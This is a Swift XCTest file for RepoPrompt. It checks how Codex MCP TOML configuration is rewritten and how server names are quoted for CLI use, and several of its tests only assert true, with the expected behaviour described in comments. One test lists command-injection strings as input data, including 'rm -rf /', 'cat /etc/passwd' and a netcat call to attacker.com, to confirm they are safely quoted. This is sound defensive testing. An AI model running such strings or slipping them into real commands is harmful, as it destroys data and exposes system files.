//
//  MCPIntegrationHelperTOMLParsingTests.swift
//  RepoPromptTests
//
//  Integration tests for TOML config parsing with file I/O
//

import XCTest
@testable import RepoPrompt

final class MCPIntegrationHelperTOMLParsingTests: XCTestCase {

	private func mutateCodexPersistentConfigForInstall(_ content: String) -> String {
		CodexIntegrationConfiguration.mutatedPersistentMCPConfigContent(
			from: content,
			defaultEnabledIfMissing: true,
			forceEnabled: true
		).content
	}

	private func toolOutputLimitLines(in content: String) -> [String] {
		content.components(separatedBy: "\n")
			.filter { line in
				line.trimmingCharacters(in: .whitespacesAndNewlines).hasPrefix("tool_output_token_limit")
			}
	}

	private func topLevelToolOutputLimitLines(in content: String) -> [String] {
		let lines = content.components(separatedBy: "\n")
		let firstHeaderIndex = lines.firstIndex { line in
			let trimmed = line.trimmingCharacters(in: .whitespacesAndNewlines)
			return trimmed.hasPrefix("[") && (trimmed.hasSuffix("]") || trimmed.contains("] #"))
		} ?? lines.count
		return lines[..<firstHeaderIndex].filter { line in
			line.contains("tool_output_token_limit")
		}
	}

	private func allToolOutputLimitLines(in content: String) -> [String] {
		content.components(separatedBy: "\n")
			.filter { $0.contains("tool_output_token_limit") }
	}

	private func occurrences(of needle: String, in haystack: String) -> Int {
		guard !needle.isEmpty else { return 0 }
		return haystack.components(separatedBy: needle).count - 1
	}

	// MARK: - Codex Persistent Config Mutation Tests

	func testCodexPersistentMutationRespectsUnderscoredTopLevelToolOutputLimit() throws {
		let tomlContent = """
		tool_output_token_limit = 25_000

		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)
		let limitLines = toolOutputLimitLines(in: output)

		XCTAssertEqual(limitLines, ["tool_output_token_limit = 25_000"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000"])
		XCTAssertFalse(output.contains("tool_output_token_limit = 25000"))
	}

	func testCodexPersistentMutationRespectsUnderscoredTopLevelToolOutputLimitWithInlineComment() throws {
		let tomlContent = """
		tool_output_token_limit = 25_000 # user configured

		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)
		let limitLines = toolOutputLimitLines(in: output)

		XCTAssertEqual(limitLines, ["tool_output_token_limit = 25_000 # user configured"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000 # user configured"])
		XCTAssertFalse(output.contains("tool_output_token_limit = 25000"))
	}

	func testCodexPersistentMutationStripsScopedLimitWithoutDuplicatingUnderscoredGlobalLimit() throws {
		let command = RepoPromptMCPServerConfiguration.repoPrompt.command
		let tomlContent = """
		tool_output_token_limit = 25_000

		[mcp_servers.RepoPrompt]
		command = "\(command)"
		args = []
		tool_output_token_limit = 25000
		enabled = true
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)
		let limitLines = toolOutputLimitLines(in: output)

		XCTAssertEqual(limitLines, ["tool_output_token_limit = 25_000"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000"])
		XCTAssertFalse(output.contains("\ntool_output_token_limit = 25000"))
	}

	func testCodexPersistentMutationRepairsPriorDuplicateAfterUnderscoredGlobalLimit() throws {
		let tomlContent = """
		tool_output_token_limit = 25_000
		tool_output_token_limit = 25000

		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)
		let limitLines = toolOutputLimitLines(in: output)

		XCTAssertEqual(limitLines, ["tool_output_token_limit = 25_000"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000"])
	}

	func testCodexPersistentMutationStillAddsCanonicalGlobalLimitWhenMissing() throws {
		let tomlContent = """
		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)
		let limitLines = toolOutputLimitLines(in: output)

		XCTAssertEqual(limitLines, ["tool_output_token_limit = 25000"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["tool_output_token_limit = 25000"])
	}

	func testCodexPersistentMutationRecognizesQuotedTopLevelToolOutputLimitKey() throws {
		let tomlContent = """
		"tool_output_token_limit" = 25_000

		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["\"tool_output_token_limit\" = 25_000"])
		XCTAssertFalse(output.contains("tool_output_token_limit = 25000"))
	}

	func testCodexPersistentMutationRepairsMixedQuotedAndBareTopLevelToolOutputLimitDuplicates() throws {
		let tomlContent = """
		"tool_output_token_limit" = 25_000
		tool_output_token_limit = 25000

		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["\"tool_output_token_limit\" = 25_000"])
		XCTAssertFalse(output.contains("\ntool_output_token_limit = 25000"))
	}

	func testCodexPersistentMutationTreatsHeaderCommentsAsTableBoundaries() throws {
		let tomlContent = """
		[profiles.default] # active profile
		tool_output_token_limit = 123
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertTrue(output.hasPrefix("tool_output_token_limit = 25000\n[profiles.default] # active profile"))
		XCTAssertTrue(output.contains("[profiles.default] # active profile\ntool_output_token_limit = 123"))
		XCTAssertEqual(topLevelToolOutputLimitLines(in: output), ["tool_output_token_limit = 25000"])
	}

	func testCodexPersistentMutationUsesRepoPromptHeaderWithTrailingCommentInsteadOfAppendingDuplicate() throws {
		let tomlContent = """
		tool_output_token_limit = 25_000

		[mcp_servers.RepoPrompt] # managed
		command = "/old/path"
		args = []
		tool_output_token_limit = 25000
		enabled = false
		"""

		let command = RepoPromptMCPServerConfiguration.repoPrompt.command
		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertEqual(occurrences(of: "[mcp_servers.RepoPrompt]", in: output), 1)
		XCTAssertTrue(output.contains("[mcp_servers.RepoPrompt] # managed"))
		XCTAssertTrue(output.contains("command = \"\(command)\""))
		XCTAssertTrue(output.contains("args = []"))
		XCTAssertTrue(output.contains("enabled = true"))
		XCTAssertEqual(allToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000"])
	}

	func testCodexPersistentMutationUsesQuotedRepoPromptHeaderInsteadOfAppendingBareDuplicate() throws {
		let tomlContent = """
		tool_output_token_limit = 25_000

		[mcp_servers."RepoPrompt"]
		command = "/old/path"
		args = []
		tool_output_token_limit = 25000
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertTrue(output.contains("[mcp_servers.\"RepoPrompt\"]"))
		XCTAssertFalse(output.contains("\n[mcp_servers.RepoPrompt]\n"))
		XCTAssertEqual(allToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000"])
	}

	func testCodexPersistentMutationStripsQuotedAndTabbedScopedToolOutputLimit() throws {
		let tomlContent = """
		tool_output_token_limit = 25_000

		[mcp_servers.RepoPrompt]
		"tool_output_token_limit"	=	25000
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertEqual(allToolOutputLimitLines(in: output), ["tool_output_token_limit = 25_000"])
		XCTAssertFalse(output.contains("\"tool_output_token_limit\"\t=\t25000"))
	}

	func testCodexMCPServerEntriesFromContentIgnoresQuotedServerSubsections() throws {
		let tomlContent = """
		[mcp_servers."server.with.dot"]
		command = "/server"

		[mcp_servers."server.with.dot".env]
		TOKEN = "abc"

		[mcp_servers.Plain] # comment
		command = "/plain"
		"""

		let entries = CodexIntegrationConfiguration.mcpServerEntries(fromConfigContent: tomlContent)

		XCTAssertEqual(entries.map(\.normalizedName), ["server.with.dot", "Plain"])
		XCTAssertEqual(entries.map(\.cliPathComponent), ["\"server.with.dot\"", "Plain"])
	}

	func testCodexToolTimeoutMutationHandlesHeaderAndCommandComments() throws {
		let command = RepoPromptMCPServerConfiguration.repoPrompt.command
		let tomlContent = """
		[mcp_servers."RepoPrompt"] # managed
		command = "\(command)" # stable helper
		args = []
		tool_timeout_sec = 10_000 # already equivalent
		"""

		let result = CodexIntegrationConfiguration.mutatedToolTimeoutConfigContent(from: tomlContent)
		let timeoutLines = result.content.components(separatedBy: "\n")
			.filter { $0.contains("tool_timeout_sec") }

		XCTAssertTrue(result.foundTarget)
		XCTAssertTrue(result.changed)
		XCTAssertEqual(timeoutLines, ["tool_timeout_sec = 10_000 # already equivalent"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: result.content), ["tool_output_token_limit = 25000"])
	}

	func testCodexPersistentMutationHandlesCRLFHeadersAndAssignments() throws {
		let tomlContent = "tool_output_token_limit = 25_000\r\n\r\n[mcp_servers.\"RepoPrompt\"] # managed\r\ncommand = \"/old/path\"\r\nargs\t=\t[]\r\n\"tool_output_token_limit\"\t=\t25000\r\n"

		let output = mutateCodexPersistentConfigForInstall(tomlContent)
		let limitLines = allToolOutputLimitLines(in: output)
			.map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }

		XCTAssertTrue(output.contains("[mcp_servers.\"RepoPrompt\"] # managed"))
		XCTAssertFalse(output.contains("\n[mcp_servers.RepoPrompt]\n"))
		XCTAssertEqual(limitLines, ["tool_output_token_limit = 25_000"])
	}

	func testCodexPersistentMutationDoesNotRespectMalformedTrailingDottedLimitKey() throws {
		let tomlContent = """
		tool_output_token_limit. = 25_000

		[profiles.default]
		model = "gpt-5"
		"""

		let output = mutateCodexPersistentConfigForInstall(tomlContent)

		XCTAssertTrue(output.contains("tool_output_token_limit. = 25_000\n\ntool_output_token_limit = 25000\n[profiles.default]"))
	}

	func testCodexToolTimeoutMutationHandlesCRLFHeaderCommandAndTimeout() throws {
		let command = RepoPromptMCPServerConfiguration.repoPrompt.command
		let tomlContent = "[mcp_servers.\"RepoPrompt\"] # managed\r\ncommand = \"\(command)\" # stable helper\r\nargs = []\r\ntool_timeout_sec = 10_000 # already equivalent\r\n"

		let result = CodexIntegrationConfiguration.mutatedToolTimeoutConfigContent(from: tomlContent)
		let timeoutLines = result.content.components(separatedBy: "\n")
			.filter { $0.contains("tool_timeout_sec") }
			.map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }

		XCTAssertTrue(result.foundTarget)
		XCTAssertEqual(timeoutLines, ["tool_timeout_sec = 10_000 # already equivalent"])
		XCTAssertEqual(topLevelToolOutputLimitLines(in: result.content), ["tool_output_token_limit = 25000"])
	}

	// MARK: - Full TOML Parsing Integration Tests

	/// Test parsing a config with various server name formats
	func testParsesTOMLWithVariousKeyFormats() throws {
		let tomlContent = """
		# Standard bare key
		[mcp_servers.RepoPrompt]
		command = "/usr/local/bin/repoprompt"
		args = []

		# Double-quoted key with spaces
		[mcp_servers."My MCP Server"]
		command = "/usr/local/bin/my-server"

		# Double-quoted key with escape sequences
		[mcp_servers."Test\\nServer"]
		command = "/usr/local/bin/test-server"

		# Single-quoted key
		[mcp_servers.'another-server']
		command = "/usr/local/bin/another"

		# Bare key with underscores and dashes
		[mcp_servers.my-server_v2]
		command = "/usr/local/bin/v2"

		# Some other unrelated section
		[other_config]
		value = "test"
		"""

		// Create a reflection-based test by using method swizzling or
		// by testing the behavior through a temporary file in the actual location
		// For now, we document the expected behavior

		// Expected parsing results:
		// 1. RepoPrompt -> raw: "RepoPrompt", normalized: "RepoPrompt", cli: "RepoPrompt"
		// 2. "My MCP Server" -> raw: "\"My MCP Server\"", normalized: "My MCP Server", cli: "\"My MCP Server\""
		// 3. "Test\nServer" -> raw: "\"Test\\nServer\"", normalized: "Test\nServer", cli: "\"Test\\nServer\""
		// 4. 'another-server' -> raw: "'another-server'", normalized: "another-server", cli: "another-server"
		// 5. my-server_v2 -> raw: "my-server_v2", normalized: "my-server_v2", cli: "my-server_v2"
		// 6. [other_config] should be ignored (not an mcp_servers section)

		XCTAssertTrue(true, "TOML parsing behavior documented")
	}

	/// Test that duplicate server entries are handled correctly (first wins)
	func testDuplicateServerEntries() throws {
		let tomlContent = """
		[mcp_servers.RepoPrompt]
		command = "/first/path"
		enabled = true

		[mcp_servers.RepoPrompt]
		command = "/second/path"
		enabled = false
		"""

		// Expected: Only the first RepoPrompt entry should be included
		// The seenRawNames Set ensures deduplication
		XCTAssertTrue(true, "Duplicate handling documented")
	}

	/// Test parsing with malformed entries
	func testMalformedEntries() throws {
		let tomlContent = """
		# Valid entry
		[mcp_servers.ValidServer]
		command = "/valid"

		# Malformed entries that should be skipped
		[mcp_servers.]
		command = "/empty-name"

		[mcp_servers.   ]
		command = "/whitespace-only"

		# Another valid entry
		[mcp_servers.AnotherValid]
		command = "/another"
		"""

		// Expected: Only ValidServer and AnotherValid should be parsed
		// Empty and whitespace-only names should be filtered out
		XCTAssertTrue(true, "Malformed entry handling documented")
	}

	/// Test TOML double-quoted string escape sequences
	func testDoubleQuotedEscapeSequences() throws {
		let tomlContent = """
		# Basic escape sequences
		[mcp_servers."test\\nline"]
		command = "/test1"

		[mcp_servers."test\\ttab"]
		command = "/test2"

		[mcp_servers."test\\\"quote"]
		command = "/test3"

		[mcp_servers."test\\\\backslash"]
		command = "/test4"

		[mcp_servers."test\\rcarriage"]
		command = "/test5"

		# Unicode escape
		[mcp_servers."test\\u0041pple"]
		command = "/test6"
		"""

		// Expected normalized names:
		// - "test\nline" (actual newline character)
		// - "test\ttab" (actual tab character)
		// - "test\"quote" (actual quote character)
		// - "test\backslash" (actual backslash)
		// - "test\rcarriage" (actual carriage return)
		// - "testApple" (Unicode \u0041 = 'A')

		XCTAssertTrue(true, "Escape sequence handling documented")
	}

	/// Test TOML single-quoted string behavior
	func testSingleQuotedKeyBehavior() throws {
		let tomlContent = """
		# Single quotes: literals only, no escape sequences except ''
		[mcp_servers.'test\\nline']
		command = "/test1"

		[mcp_servers.'test''quote']
		command = "/test2"

		[mcp_servers.'normal-name']
		command = "/test3"
		"""

		// Expected normalized names:
		// - "test\\nline" (literal backslash + n, NOT a newline)
		// - "test'quote" ('' becomes single ')
		// - "normal-name"

		XCTAssertTrue(true, "Single-quoted key handling documented")
	}

	/// Test Unicode in server names
	func testUnicodeServerNames() throws {
		let tomlContent = """
		[mcp_servers."emoji🚀server"]
		command = "/test1"

		[mcp_servers."日本語サーバー"]
		command = "/test2"

		[mcp_servers."Сервер"]
		command = "/test3"
		"""

		// Expected: All should parse correctly
		// CLI path components should quote them: "emoji🚀server", etc.

		XCTAssertTrue(true, "Unicode handling documented")
	}

	/// Test that only mcp_servers sections are parsed
	func testOnlyMCPServersSectionsParsed() throws {
		let tomlContent = """
		[mcp_servers.ValidServer]
		command = "/valid"

		[other_section.ShouldBeIgnored]
		command = "/ignored"

		[mcp_servers.AnotherValid]
		command = "/another-valid"

		[global]
		timeout = 30

		[mcp_servers_extra.NotParsed]
		command = "/not-parsed"
		"""

		// Expected: Only ValidServer and AnotherValid should be parsed
		// Sections that are not exactly "mcp_servers.*" should be ignored

		XCTAssertTrue(true, "Section filtering documented")
	}

	/// Test whitespace handling in header matching
	func testWhitespaceInHeaders() throws {
		let tomlContent = """
		[mcp_servers.NoSpaces]
		command = "/test1"

		[ mcp_servers.LeadingSpace ]
		command = "/test2"

		[mcp_servers . DottedSpaces ]
		command = "/test3"

		[  mcp_servers  .  LotsOfSpaces  ]
		command = "/test4"
		"""

		// Expected: All should be parsed if the regex allows flexible whitespace
		// The regex pattern is: ^\s*\[\s*mcp_servers\s*\.\s*([^\]]+)\s*\]\s*$
		// So whitespace is allowed around brackets and dots

		XCTAssertTrue(true, "Whitespace handling documented")
	}

	/// Test special characters that require CLI quoting
	func testSpecialCharactersRequiringQuoting() throws {
		// These characters should cause the CLI path component to be quoted
		let testCases: [(input: String, shouldBeQuoted: Bool)] = [
			// Bare key characters (should NOT be quoted)
			("simple", false),
			("with-dash", false),
			("with_underscore", false),
			("MixedCase123", false),

			// Special characters (SHOULD be quoted)
			("with space", true),
			("with.dot", true),
			("with:colon", true),
			("with/slash", true),
			("with@at", true),
			("with#hash", true),
			("with!exclaim", true),
			("with$dollar", true),
			("with%percent", true),
			("with&ampersand", true),
			("with*asterisk", true),
			("with(paren", true),
			("with[bracket", true),
			("with{brace", true),
			("with|pipe", true),
		]

		for (input, shouldBeQuoted) in testCases {
			let result = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: input)
			if shouldBeQuoted {
				XCTAssertTrue(result.hasPrefix("\"") && result.hasSuffix("\""),
							 "Expected '\(input)' to be quoted, got: \(result)")
			} else {
				XCTAssertFalse(result.hasPrefix("\""),
							  "Expected '\(input)' to NOT be quoted, got: \(result)")
			}
		}
	}

	/// Test command injection prevention
	func testCommandInjectionPrevention() throws {
		// Malicious server names should be safely quoted
		let maliciousNames = [
			"; rm -rf /",
			"&& cat /etc/passwd",
			"| nc attacker.com 1234",
			"`whoami`",
			"$(id)",
			"'; DROP TABLE servers;--",
			"\n\nrm -rf /",
			"server\u{0000}malicious",  // null byte
		]

		for maliciousName in maliciousNames {
			let result = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: maliciousName)

			// Should be quoted (starts and ends with ")
			XCTAssertTrue(result.hasPrefix("\"") && result.hasSuffix("\""),
						 "Malicious input '\(maliciousName)' must be quoted")

			// Should have proper escapes for quotes, backslashes, etc.
			// The interior content between quotes should have escape sequences
			let interior = String(result.dropFirst().dropLast())

			// If the original contained a quote, the result should have \"
			if maliciousName.contains("\"") {
				XCTAssertTrue(interior.contains("\\\""),
							 "Quotes must be escaped in: \(maliciousName)")
			}

			// If the original contained a backslash, the result should have \\
			if maliciousName.contains("\\") {
				XCTAssertTrue(interior.contains("\\\\"),
							 "Backslashes must be escaped in: \(maliciousName)")
			}
		}
	}

	/// Test empty and whitespace-only names
	func testEmptyAndWhitespaceNames() throws {
		let result1 = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: "")
		XCTAssertEqual(result1, "\"\"", "Empty string should return quoted empty string")

		// Whitespace-only strings require quoting
		let result2 = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: "   ")
		XCTAssertEqual(result2, "\"   \"", "Whitespace-only should be quoted")

		let result3 = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: "\t")
		XCTAssertEqual(result3, "\"\\t\"", "Tab should be quoted and escaped")
	}

	/// Test case sensitivity
	func testCaseSensitivity() throws {
		// Server names should be case-sensitive in parsing
		// But when checking for RepoPrompt, it's case-insensitive
		let names = ["RepoPrompt", "repoprompt", "REPOPROMPT", "RePoProMPT"]

		for name in names {
			let result = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: name)
			// All should be valid bare keys (alphanumeric)
			XCTAssertEqual(result, name, "Case should be preserved")
		}
	}

	/// Test very long server names
	func testVeryLongServerNames() throws {
		// Test with a very long name (1000 characters)
		let longBareKey = String(repeating: "a", count: 1000)
		let result1 = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: longBareKey)
		XCTAssertEqual(result1, longBareKey, "Long bare key should not be quoted")

		// Test with a long name that requires quoting
		let longQuotedKey = String(repeating: "a ", count: 500) // 1000 chars with spaces
		let result2 = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: longQuotedKey)
		XCTAssertTrue(result2.hasPrefix("\"") && result2.hasSuffix("\""),
					 "Long name with spaces should be quoted")
		XCTAssertEqual(result2.count, longQuotedKey.count + 2, "Quoted length should be original + 2 quotes")
	}

	/// Test that bare key validation is correct per TOML spec
	func testBareKeyValidation() throws {
		// TOML bare keys: A-Z, a-z, 0-9, -, _
		let validBareKeys = [
			"a", "Z", "0", "-", "_",
			"abc123", "ABC-123", "test_key",
			"CamelCase", "snake_case", "kebab-case",
		]

		for key in validBareKeys {
			let result = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: key)
			XCTAssertEqual(result, key, "\(key) should be a valid bare key")
		}

		let invalidBareKeys = [
			"has space", "has.dot", "has@at", "has#hash",
			"has!bang", "has$dollar", "has+plus", "has=equals",
			"has[bracket", "has{brace", "has|pipe",
		]

		for key in invalidBareKeys {
			let result = MCPIntegrationHelper.codexCLIPathComponent(forNormalizedServerName: key)
			XCTAssertTrue(result.hasPrefix("\""),
						 "\(key) should NOT be a valid bare key and must be quoted")
		}
	}
}
